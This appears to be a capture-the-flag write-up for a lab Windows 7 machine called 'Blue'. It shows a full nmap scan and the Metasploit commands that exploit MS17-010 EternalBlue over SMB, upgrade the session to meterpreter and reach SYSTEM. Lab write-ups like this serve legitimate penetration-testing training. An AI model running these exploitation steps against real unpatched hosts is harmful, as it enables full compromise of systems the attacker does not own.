# Blue

IP: `10.10.10.40`

## Initial scan

```sh
nmap -A -T5 -p- 10.10.10.40
```

Result
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 00:53 EDT
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Warning: 10.10.10.40 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.40
Host is up (0.073s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%), Microsoft Windows 8.1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m16s, deviation: 0s, median: 1m15s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-03-16T05:03:42+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-16T05:03:45
|_  start_date: 2020-03-16T04:54:16

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   72.60 ms 10.10.14.1
2   72.70 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 535.49 seconds
```

## Attack plan

1. First try the microsoft-ds port `445`
2. Try ports `135` or `139`
3. Go for the high numbered ports

## Eternal-blue MS17-010

For this, we are attacking port 445

```sh
msfconsole
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > show targets
msf exploit(ms17_010_eternalblue) > set TARGET 0
msf exploit(ms17_010_eternalblue) > show options
msf exploit(ms17_010_eternalblue) > set rhosts 10.10.10.40
msf exploit(ms17_010_eternalblue) > exploit
```

And it worked!

Now let's upgrade the session to a meterpreter session

```sh
background
upgrade sessions 1

# a merterpreter shell was created on session 2

sesions 2
```

Let's wee who I am

```sh
getuid
# NT AUTHORITY\SYSTEM
```

## Takeaways
- Sometimes the machine name gives away a lot. In this instance, the machine's name was blue and the exploit was named eternal blue!